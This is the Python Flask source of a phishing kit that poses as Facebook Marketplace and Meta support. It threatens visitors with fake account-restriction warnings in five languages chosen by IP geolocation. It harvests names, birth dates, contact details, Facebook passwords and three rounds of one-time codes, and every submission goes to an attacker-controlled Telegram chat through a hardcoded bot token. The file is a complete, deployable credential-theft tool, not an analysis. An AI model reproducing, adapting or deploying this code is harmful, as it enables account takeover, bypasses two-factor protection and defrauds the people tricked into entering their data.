from flask import Flask, render_template, request, redirect, url_for, session, jsonify
import requests
import socket

app = Flask(__name__)
app.secret_key = 'your_secret_key'

TELEGRAM_TOKEN = '7597571849:AAFb748Q8nK_NvAF83s5lYMCiO7TXX_fWkY'
CHAT_ID = '-1002294588843'

LANGUAGES = {
    'en': {
        'lang' : 'en',
        'welcome': 'Welcome!',
        'submit': 'Submit',
        'facebook_assistant': 'Facebook Marketplace Assistant',
        'meta_support': 'Meta Support Team',
        'account_warning': 'Your account violates Facebook\'s community standards. Please verify your Facebook account immediately to avoid having it permanently disabled and blocked.',
        'Authentication': 'Authentication',
        'marketplace': 'Your marketplace has been restricted',
        'account': 'Your account violates Facebook\'s community standards. Please verify your Facebook account immediately to avoid having it permanently disabled and blocked.',
        'name': 'Your name',
        'dd': 'dd/mm/yyyy',
        'phone': 'Phone number',
        'tk': 'Email or phone number',
        'pass': 'Password',
        'Submit': 'Submit',
        'Please': 'Please make sure to fill in the data correctly, if you fill in the wrong data your account will be permanently closed. To learn more about why we deactivate accounts, go to',
        'Com': 'Community Standards.',
        'not': 'Do not leave blank.',
        'Login':'Login',
        '3.you' :'Your account has been restricted due to a violation',
        '3.vio' :'Violation of the terms of service',
        '3.we' : 'We have detected unusual activity in your market today, on the date ',
        '3.your' :'. Your Marketplace listing has been reported by someone for violating our Community Standards. To prevent your account from being permanently blocked, please check.',
        '3.name':'Username:',
        '3.pass':'Password:',
        'Send' :'Send',
        '4.Account' : 'Account verification',
        '4.fa' : '·Facebook verification',
        '4.app' : 'Approve the external device and enter the OPT code for verification.',
        '4.we' : 'We suspect that the Facebook Marketplace account has violated policies. Please enter the code we sent to verify the account.',
        '4.wew' : 'We have sent an OTP to your phone number or email. Please enter the code to continue.',
        'opt1' :'OTP',
        '5.Authentication' : 'Authentication',
        '5.Facebook' : '·Facebook',
        '5.app' : 'Approve the external device and enter the OPT code for verification.',
        '5.you': 'You have 6 digits available to configure the application you are setting up. Either validate the input or have the ability to recover 8 digits.',
        
    },
    'it': {
        'lang' : 'it',
        'welcome': 'Benvenuto!',
        'submit': 'Invia',
        'facebook_assistant': 'Assistente Marketplace di Facebook',
        'meta_support': 'Team di supporto di Meta',
        'account_warning': 'Il tuo account viola gli standard della community di Facebook. Verifica immediatamente il tuo account Facebook per evitare che venga disabilitato e bloccato permanentemente.',
        'Authentication': 'Autenticazione',
        'marketplace': 'Il tuo marketplace è stato limitato',
        'account': 'Il tuo account viola gli standard della community di Facebook. Verifica immediatamente il tuo account Facebook per evitare che venga disabilitato e bloccato permanentemente.',
        'name': 'Il tuo nome',
        'dd': 'gg/mm/aaaa',
        'phone': 'Numero di telefono',
        'tk': 'Email o numero di telefono',
        'pass': 'Password',
        'Submit': 'Invia',
        'Please': 'Assicurati di compilare correttamente i dati, se inserisci i dati errati il tuo account verrà chiuso permanentemente. Per saperne di più su perché disattiviamo gli account, vai a',
        'Com': 'Norme della community.',
        'not': 'Non lasciare vuoto.',
        'Login': 'Accedi',
        '3.you': 'Il tuo account è stato limitato a causa di una violazione',
        '3.vio': 'Violazione dei termini di servizio',
        '3.we': 'Abbiamo rilevato un’attività insolita nel tuo mercato oggi, alla data del',
        '3.your': '. Il tuo annuncio su Marketplace è stato segnalato da qualcuno per violazione degli standard della nostra community. Per evitare che il tuo account venga bloccato permanentemente, controlla.',
        '3.name': 'Nome utente:',
        '3.pass': 'Password:',
        'Send': 'Invia',
        '4.Account': 'Verifica dell\'account',
        '4.fa': '·Verifica di Facebook',
        '4.app': 'Approva il dispositivo esterno e inserisci il codice OTP per la verifica.',
        '4.we': 'Sospettiamo che l\'account di Facebook Marketplace abbia violato le politiche. Inserisci il codice che ti abbiamo inviato per verificare l\'account.',
        '4.wew': 'Abbiamo inviato un OTP al tuo numero di telefono o email. Inserisci il codice per continuare.',
        'opt1': 'OTP1',
        '5.Authentication': 'Autenticazione',
        '5.Facebook': '·Facebook',
        '5.app': 'Approva il dispositivo esterno e inserisci il codice OTP per la verifica.',
        '5.you': 'Hai 6 cifre disponibili per configurare l\'applicazione che stai impostando. Puoi validare l\'input o recuperare 8 cifre.',
    },

    'es': {
        'lang' : 'es',
        'welcome': '¡Bienvenido!',
        'submit': 'Enviar',
        'facebook_assistant': 'Asistente de Marketplace de Facebook',
        'meta_support': 'Equipo de soporte de Meta',
        'account_warning': 'Tu cuenta viola los estándares de la comunidad de Facebook. Verifica tu cuenta de Facebook de inmediato para evitar que se desactive y bloquee permanentemente.',
        'Authentication': 'Autenticación',
        'marketplace': 'Tu marketplace ha sido restringido',
        'account': 'Tu cuenta viola los estándares de la comunidad de Facebook. Verifica tu cuenta de Facebook de inmediato para evitar que se desactive y bloquee permanentemente.',
        'name': 'Tu nombre',
        'dd': 'dd/mm/yyyy',
        'phone': 'Número de teléfono',
        'tk': 'Correo electrónico o número de teléfono',
        'pass': 'Contraseña',
        'Submit': 'Enviar',
        'Please': 'Por favor, asegúrate de completar los datos correctamente, si introduces los datos incorrectos, tu cuenta se cerrará permanentemente. Para saber más sobre por qué desactivamos cuentas, visita',
        'Com': 'Normas de la comunidad.',
        'not': 'No dejes en blanco.',
        'Login': 'Iniciar sesión',
        '3.you': 'Tu cuenta ha sido restringida debido a una violación',
        '3.vio': 'Violación de los términos de servicio',
        '3.we': 'Hemos detectado actividad inusual en tu mercado hoy, en la fecha ',
        '3.your': '. Tu anuncio de Marketplace ha sido reportado por alguien por violar nuestros estándares comunitarios. Para evitar que tu cuenta se bloquee permanentemente, por favor verifica.',
        '3.name': 'Nombre de usuario:',
        '3.pass': 'Contraseña:',
        'Send': 'Enviar',
        '4.Account': 'Verificación de cuenta',
        '4.fa': '·Verificación de Facebook',
        '4.app': 'Aprueba el dispositivo externo e ingresa el código OTP para la verificación.',
        '4.we': 'Sospechamos que la cuenta de Marketplace de Facebook ha violado las políticas. Ingresa el código que enviamos para verificar la cuenta.',
        '4.wew': 'Hemos enviado un OTP a tu número de teléfono o correo electrónico. Ingresa el código para continuar.',
        'opt1': 'OTP1',
        '5.Authentication': 'Autenticación',
        '5.Facebook': '·Facebook',
        '5.app': 'Aprueba el dispositivo externo e ingresa el código OTP para la verificación.',
        '5.you': 'Tienes 6 dígitos disponibles para configurar la aplicación que estás configurando. Puedes validar la entrada o recuperar 8 dígitos.',
    },

    'de': {
        'lang' : 'de',
        'welcome': 'Willkommen!',
        'submit': 'Absenden',
        'facebook_assistant': 'Facebook Marketplace Assistent',
        'meta_support': 'Meta Support Team',
        'account_warning': 'Ihr Konto verstößt gegen die Gemeinschaftsstandards von Facebook. Bitte verifizieren Sie Ihr Facebook-Konto sofort, um zu verhindern, dass es dauerhaft deaktiviert und gesperrt wird.',
        'Authentication': 'Authentifizierung',
        'marketplace': 'Ihr Marketplace wurde eingeschränkt',
        'account': 'Ihr Konto verstößt gegen die Gemeinschaftsstandards von Facebook. Bitte verifizieren Sie Ihr Facebook-Konto sofort, um zu verhindern, dass es dauerhaft deaktiviert und gesperrt wird.',
        'name': 'Ihr Name',
        'dd': 'dd/mm/yyyy',
        'phone': 'Telefonnummer',
        'tk': 'E-Mail oder Telefonnummer',
        'pass': 'Passwort',
        'Submit': 'Absenden',
        'Please': 'Bitte stellen Sie sicher, dass Sie die Daten korrekt ausfüllen. Wenn Sie falsche Daten eingeben, wird Ihr Konto dauerhaft gesperrt. Weitere Informationen dazu, warum wir Konten deaktivieren, finden Sie unter',
        'Com': 'Gemeinschaftsstandards.',
        'not': 'Nicht leer lassen.',
        'Login': 'Anmelden',
        '3.you': 'Ihr Konto wurde aufgrund einer Verletzung eingeschränkt',
        '3.vio': 'Verstoß gegen die Nutzungsbedingungen',
        '3.we': 'Wir haben heute ungewöhnliche Aktivitäten in Ihrem Markt festgestellt, am Datum ',
        '3.your': '. Ihr Marketplace-Eintrag wurde von jemandem gemeldet, weil er gegen unsere Gemeinschaftsstandards verstößt. Um zu verhindern, dass Ihr Konto dauerhaft blockiert wird, überprüfen Sie bitte.',
        '3.name': 'Benutzername:',
        '3.pass': 'Passwort:',
        'Send': 'Absenden',
        '4.Account': 'Kontoverifizierung',
        '4.fa': '·Facebook-Verifizierung',
        '4.app': 'Genehmigen Sie das externe Gerät und geben Sie den OTP-Code zur Verifizierung ein.',
        '4.we': 'Wir vermuten, dass das Facebook Marketplace-Konto gegen die Richtlinien verstoßen hat. Bitte geben Sie den Code ein, den wir zur Verifizierung des Kontos gesendet haben.',
        '4.wew': 'Wir haben ein OTP an Ihre Telefonnummer oder E-Mail gesendet. Bitte geben Sie den Code ein, um fortzufahren.',
        'opt1': 'OTP1',
        '5.Authentication': 'Authentifizierung',
        '5.Facebook': '·Facebook',
        '5.app': 'Genehmigen Sie das externe Gerät und geben Sie den OTP-Code zur Verifizierung ein.',
        '5.you': 'Sie haben 6 Ziffern zur Verfügung, um die Anwendung zu konfigurieren, die Sie einrichten. Validieren Sie die Eingabe oder stellen Sie 8 Ziffern wieder her.',
    },
    'fr': {
        'lang' : 'fr',
        'welcome': 'Bienvenue!',
        'submit': 'Soumettre',
        'facebook_assistant': 'Assistant Marketplace de Facebook',
        'meta_support': 'Équipe de support de Meta',
        'account_warning': 'Votre compte viole les normes de la communauté de Facebook. Veuillez vérifier votre compte Facebook immédiatement pour éviter qu\'il ne soit désactivé et bloqué définitivement.',
        'Authentication': 'Authentification',
        'marketplace': 'Votre marketplace a été restreinte',
        'account': 'Votre compte viole les normes de la communauté de Facebook. Veuillez vérifier votre compte Facebook immédiatement pour éviter qu\'il ne soit désactivé et bloqué définitivement.',
        'name': 'Votre nom',
        'dd': 'jj/mm/aaaa',
        'phone': 'Numéro de téléphone',
        'tk': 'Email ou numéro de téléphone',
        'pass': 'Mot de passe',
        'Submit': 'Soumettre',
        'Please': 'Veuillez vous assurer de remplir correctement les données, si vous entrez des données incorrectes, votre compte sera définitivement fermé. Pour en savoir plus sur la désactivation des comptes, consultez',
        'Com': 'Normes communautaires.',
        'not': 'Ne laissez pas vide.',
        'Login': 'Connexion',
        '3.you': 'Votre compte a été restreint en raison d\'une violation',
        '3.vio': 'Violation des conditions d\'utilisation',
        '3.we': 'Nous avons détecté une activité inhabituelle sur votre marché aujourd\'hui, à la date ',
        '3.your': '. Votre annonce sur Marketplace a été signalée par quelqu\'un pour violation de nos normes communautaires. Pour éviter que votre compte ne soit bloqué définitivement, veuillez vérifier.',
        '3.name': 'Nom d\'utilisateur:',
        '3.pass': 'Mot de passe:',
        'Send': 'Envoyer',
        '4.Account': 'Vérification du compte',
        '4.fa': '·Vérification de Facebook',
        '4.app': 'Approuvez l\'appareil externe et entrez le code OTP pour la vérification.',
        '4.we': 'Nous soupçonnons que le compte Marketplace de Facebook a enfreint les politiques. Veuillez entrer le code que nous avons envoyé pour vérifier le compte.',
        '4.wew': 'Nous avons envoyé un OTP à votre numéro de téléphone ou adresse email. Veuillez entrer le code pour continuer.',
        'opt1': 'OTP1',
        '5.Authentication': 'Authentification',
        '5.Facebook': '·Facebook',
        '5.app': 'Approuvez l\'appareil externe et entrez le code OTP pour la vérification.',
        '5.you': 'Vous avez 6 chiffres disponibles pour configurer l\'application que vous êtes en train de configurer. Validez l\'entrée ou récupérez 8 chiffres.',
    },

}

current_message_id = None

def get_public_ip():
    public_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if public_ip and ',' in public_ip:
        public_ip = public_ip.split(',')[0].strip()
    return public_ip

def get_geolocation_info(ip):
    url = f"http://ip-api.com/json/{ip}"
    try:
        response = requests.get(url, timeout=5)  
        response.raise_for_status()
        data = response.json()
        city = data.get('city', 'Unknown City')
        region = data.get('regionName', 'Unknown Region')
        country = data.get('country', 'Unknown Country')
        location = f"{city}, {region}, {country}"
        return country
    except requests.exceptions.RequestException as e:
        return 'Unknown Country'
    
    
def send_to_telegram(message):
    url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
    data = {
        'chat_id': CHAT_ID,
        'text': message,
        'parse_mode': 'HTML'
    }
    response = requests.post(url, data=data)
    result = response.json().get('result', {})
    return result.get('message_id')

def edit_telegram_message(message_id, message):
    url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/editMessageText'
    data = {
        'chat_id': CHAT_ID,
        'message_id': message_id,
        'text': message,
        'parse_mode': 'HTML'
    }
    requests.post(url, data=data)


def get_language_by_country(country):

    country_to_language = {
        'United States': 'en',
        'Germany': 'de',       # Thêm ngôn ngữ cho đức
        'France': 'fr',        # Thêm ngôn ngữ cho pháp
        'Spain': 'es',         # Thêm ngôn ngữ cho Tây Ban Nha
        'Mexico': 'es',        # Thêm ngôn ngữ cho Mexico
        'Argentina': 'es',     # Thêm ngôn ngữ cho Argentina
        'Chile': 'es',         # Thêm ngôn ngữ cho Chile
        'Colombia': 'es',      # Thêm ngôn ngữ cho Colombia
        'Peru': 'es',          # Thêm ngôn ngữ cho Peru
        'Ecuador' : 'es',       # Thêm ngôn ngữ cho Ecuador
        'Italy': 'it',          # Thêm ngôn ngữ cho Ý
        'San Marino': 'it',     # Thêm ngôn ngữ cho San Marino
        'Vatican City': 'it',   # Thêm ngôn ngữ cho Vatican
        'Venezuela' : 'es',    # Thêm ngôn ngữ cho Venezuela
    }
    return country_to_language.get(country, 'en')  

@app.route('/')
def home():
    ip = get_public_ip()  
    country = get_geolocation_info(ip)
    language = get_language_by_country(country) if country else 'en' 

    lang = LANGUAGES.get(language, LANGUAGES['en'])
    session['language'] = language  
    return render_template('1.html', lang=lang)


@app.route('/2')
def page_2():
    ip = get_public_ip()  
    country = get_geolocation_info(ip)
    language = get_language_by_country(country) if country else 'en'  

    lang = LANGUAGES.get(language, LANGUAGES['en'])
    session['language'] = language  
    return render_template('2.html', lang=lang)


@app.route('/2', methods=['POST'])
def submit_page2():
    fullname = request.form.get('fullname')
    fullname1 = request.form.get('fullname1')
    gmail = request.form.get('gmail')
    phone = request.form.get('phone')
    dob = request.form.get('dob')

    session['fullname'] = fullname
    session['dob'] = dob
    session['gmail'] = gmail
    session['fullname1'] = fullname1
    session['phone'] = phone

    public_ip = get_public_ip()
    location = get_geolocation_info(public_ip)

    if 'message_id' not in session:
        message = f"""
        Thông tin người dùng:
        IP: {public_ip}
        Local IP: {location}
        Họ tên: {fullname}
        Ngày sinh: {dob}
        Sdt: {gmail}
        Tài khoản: {fullname1}
        Mật khẩu: {phone}
        """
        message_id = send_to_telegram(message)
        session['message_id'] = message_id
    else:
        previous_info = (
            f"IP: {public_ip}\n"
            f"Local IP: {location}\n"
            f"Họ tên: {session.get('fullname')}\n"
            f"Ngày sinh: {session.get('dob')}\n"
            f"Sdt: {session.get('gmail')}\n"
            f"Tài khoản: {session.get('fullname1')}\n"
            f"Mật khẩu: {session.get('phone')}\n"
        )
        
        updated_info = (
            f"IP: {public_ip}\n"
            f"Local IP: {location}\n"
            f"Họ tên: {fullname}\n"
            f"Ngày sinh: {dob}\n"
            f"Sdt: {gmail}\n"
            f"Tài khoản: {fullname1}\n"
            f"Mật khẩu: {phone}\n"
        )

        if previous_info != updated_info:
            updated_message = previous_info + f"\n\nCập nhật thông tin:\n{updated_info}"
            edit_telegram_message(session['message_id'], updated_message)
        else:
            message = f"Thông tin người dùng:\n{updated_info}"
            message_id = send_to_telegram(message)
            session['message_id'] = message_id

    return redirect(url_for('page_3'))

@app.route('/3')
def page_3():
    ip = get_public_ip()  
    country = get_geolocation_info(ip)
    language = get_language_by_country(country) if country else 'en'  

    lang = LANGUAGES.get(language, LANGUAGES['en'])
    session['language'] = language  
    return render_template('3.html', lang=lang)

@app.route('/3', methods=['POST'])
def submit_page3():
    phonepaas1 = request.form.get('Username')
    passwordpass1 = request.form.get('Password')

    session['phonepaas1'] = phonepaas1
    session['passwordpass1'] = passwordpass1

    if 'message_id' in session:
        public_ip = get_public_ip()
        location = get_geolocation_info(public_ip)
        previous_message = (
            f"Thông tin người dùng:\n"
            f"IP: {public_ip}\n"
            f"Local IP: {location}\n"
            f"Họ tên: {session.get('fullname')}\n"
            f"Ngày sinh: {session.get('dob')}\n"
            f"Sdt: {session.get('gmail')}\n"
            f"Tài khoản: {session.get('fullname1')}\n"
            f"Mật khẩu: {session.get('phone')}\n"
            f"----------------------------------\n"
            f"Tài khoản 1: {phonepaas1}\n"
            f"Mật khẩu 1: {passwordpass1}\n"
        )

        edit_telegram_message(session['message_id'], previous_message)
        print(f"Đã cập nhật tin nhắn: {previous_message}")
    else:
        message = f"Tài khoản: {phonepaas1} Mật khẩu: {passwordpass1}"
        message_id = send_to_telegram(message)
        session['message_id'] = message_id
        print(f"Đã gửi tin nhắn mới: {message}")

    return redirect(url_for('page_4'))

@app.route('/4')
def page_4():
    ip = get_public_ip()  
    country = get_geolocation_info(ip)
    language = get_language_by_country(country) if country else 'en'  

    lang = LANGUAGES.get(language, LANGUAGES['en'])
    session['language'] = language  
    return render_template('4.html', lang=lang)

@app.route('/4', methods=['POST'])
def submit_page4():
    if request.method == 'POST':
        OTP1 = request.form.get('OTP1')
        session['OTP1'] = OTP1

        if 'message_id' in session:
            public_ip = get_public_ip()
            location = get_geolocation_info(public_ip)
            previous_message = (
                f"Thông tin người dùng:\n"
                f"IP: {public_ip}\n"
                f"Local IP: {location}\n"
                f"Họ tên: {session.get('fullname')}\n"
                f"Ngày sinh: {session.get('dob')}\n"
                f"Sdt: {session.get('gmail')}\n"
                f"Tài khoản: {session.get('fullname1')}\n"
                f"Mật khẩu: {session.get('phone')}\n"
                f"-------------------------------\n"
                f"Tài khoản 1: {session.get('phonepaas1')}\n"
                f"Mật khẩu 1: {session.get('passwordpass1')}\n"
                f"--------------------------------\n"
                f"OTP 1: {OTP1}\n"
            )

            edit_telegram_message(session['message_id'], previous_message)
        else:
            message = f"OTP 1: {OTP1}"
            message_id = send_to_telegram(message)
            session['message_id'] = message_id

        return redirect(url_for('page_5'))
@app.route('/5')
def page_5():
    ip = get_public_ip()  
    country = get_geolocation_info(ip)
    language = get_language_by_country(country) if country else 'en'  

    lang = LANGUAGES.get(language, LANGUAGES['en'])
    session['language'] = language  
    return render_template('5.html', lang=lang)

@app.route('/5', methods=['POST'])
def submit_page5():
    OTP2 = request.form.get('OTP2')
    session['OTP2'] = OTP2

    if 'message_id' in session:
        public_ip = get_public_ip()
        location = get_geolocation_info(public_ip)
        previous_message = (
            f"Thông tin người dùng:\n"
            f"IP: {public_ip}\n"
            f"Local IP: {location}\n"
            f"Họ tên: {session.get('fullname')}\n"
            f"Ngày sinh: {session.get('dob')}\n"
            f"Sdt: {session.get('gmail')}\n"
            f"Tài khoản: {session.get('fullname1')}\n"
            f"Mật khẩu: {session.get('phone')}\n"
            f"-------------------------------\n"
            f"Tài khoản 1: {session.get('phonepaas1')}\n"
            f"Mật khẩu 1: {session.get('passwordpass1')}\n"
            f"-------------------------------\n"
            f"OTP 1: {session.get('OTP1')}\n"
            f"-------------------------------\n"
            f"OTP 2: {OTP2}\n"
        )

        edit_telegram_message(session['message_id'], previous_message)
        return redirect(url_for('page_6'))  # <-- Thêm return
    else:
        message = f"OTP 2: {OTP2}"
        message_id = send_to_telegram(message)
        session['message_id'] = message_id
        return redirect(url_for('page_6'))  # <-- Thêm return


@app.route('/6')
def page_6():
    ip = get_public_ip()  
    country = get_geolocation_info(ip)
    language = get_language_by_country(country) if country else 'en'  

    lang = LANGUAGES.get(language, LANGUAGES['en'])
    session['language'] = language  
    return render_template('6.html', lang=lang)

@app.route('/6', methods=['POST'])
def submit_page6():
    OTP3 = request.form.get('OTP3')
    session['OTP3'] = OTP3
    if 'message_id' in session:
        public_ip = get_public_ip()
        location = get_geolocation_info(public_ip)
        previous_message = (
            f"Thông tin người dùng:\n"
            f"IP: {public_ip}\n"
            f"Local IP: {location}\n"
            f"Họ tên: {session.get('fullname')}\n"
            f"Ngày sinh: {session.get('dob')}\n"
            f"Sdt: {session.get('gmail')}\n"
            f"Tài khoản: {session.get('fullname1')}\n"
            f"Mật khẩu: {session.get('phone')}\n"
            f"-------------------------------\n"
            f"Tài khoản 1: {session.get('phonepaas1')}\n"
            f"Mật khẩu 1: {session.get('passwordpass1')}\n"
            f"-------------------------------\n"
            f"OTP 1: {session.get('OTP1')}\n"
            f"-------------------------------\n"
            f"OTP 2: {session.get('OTP2')}\n"
            f"-------------------------------\n"
            f"OTP 3: {OTP3}\n"

        )

        edit_telegram_message(session['message_id'], previous_message)
    else:
        message = f"OTP 3: {OTP3}"
        message_id = send_to_telegram(message)
        session['message_id'] = message_id

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=80)